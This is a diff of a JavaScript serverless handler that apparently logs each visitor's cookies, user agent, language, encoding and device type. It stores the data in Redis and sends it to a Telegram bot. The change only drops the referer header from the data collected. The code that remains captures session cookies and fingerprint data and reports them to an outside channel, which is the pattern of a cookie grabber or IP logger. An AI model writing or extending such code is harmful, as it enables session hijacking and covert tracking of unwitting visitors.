@@ -45,10 +45,9 @@ export const handler = async (event, context) => {
     const cookies = event.headers.cookie || 'No cookies found';
     const cookieInfo = cookies.length > 100 ? cookies.substring(0, 100) + '...' : cookies;
     
-    // Get additional browser fingerprinting data
+    // Get additional browser fingerprinting data (excluding referer)
     const acceptLanguage = event.headers['accept-language'] || 'Unknown';
     const acceptEncoding = event.headers['accept-encoding'] || 'Unknown';
-    const referer = event.headers.referer || 'Direct access';
     
     // Check environment variables first
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -125,8 +124,7 @@ export const handler = async (event, context) => {
       deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'mobile' : 'desktop',
       cookies: cookieInfo,
       acceptLanguage,
-      acceptEncoding,
-      referer
+      acceptEncoding
     };
 
     try {
@@ -138,7 +136,7 @@ export const handler = async (event, context) => {
       // Continue with Telegram even if Redis fails
     }
 
-    // Format message for Telegram with better mobile detection
+    // Format message for Telegram with better mobile detection (without referer)
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile Device' : '💻 Desktop';
     
     const message = `
@@ -153,7 +151,6 @@ export const handler = async (event, context) => {
 ${deviceInfo}
 🌍 *Language:* \`${acceptLanguage}\`
 📦 *Encoding:* \`${acceptEncoding}\`
-🔗 *Referer:* \`${referer}\`
 🍪 *Cookies:* \`${cookieInfo}\`
 🆔 *Session ID:* \`${sessionId}\`
 
